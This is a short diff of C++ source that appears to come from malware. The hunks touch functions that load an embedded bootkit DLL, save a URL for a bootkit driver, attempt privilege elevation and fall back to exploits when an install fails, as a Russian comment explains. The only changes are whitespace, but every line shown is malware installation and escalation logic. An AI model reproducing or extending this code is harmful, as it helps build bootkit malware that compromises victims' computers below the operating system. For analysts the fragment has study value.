@@ -336,7 +336,7 @@ bool SetupBootkit()
 	PP_DPRINTF("ExplorerStart: looking for setup dll...");
 
 	TMemoryDLL BkImage(BootkitDll::data);
-	
+
 	if( BkImage.IsTrue() )
 	{
 		bool uid_saved = SaveUrlForBootkitDriver();
@@ -559,7 +559,7 @@ DWORD WINAPI ExplorerRoutine( LPVOID lpData )
 
 		PP_DPRINTF("ExplorerRoutine: TakePrivile result=%d", bRun);
 		IsUsedExploit = TRUE; // По идее это всегда TRUE
-	};		
+	};
 
 	if ( bRun )
 	{
@@ -567,7 +567,7 @@ DWORD WINAPI ExplorerRoutine( LPVOID lpData )
 		bRet = ExplorerMain();
 		PP_DPRINTF("ExplorerRoutine: ExplorerMain() result=%d", bRet);
 	}
-	
+
 	/*		Если есть права Админа но мы не юзали сплоеты и инстал не удался, юзаем сплоеты и снова делаем инстал		*/
 	if ( (bRet == FALSE) && (bRun == TRUE) && (IsUsedExploit == FALSE) )
 	{
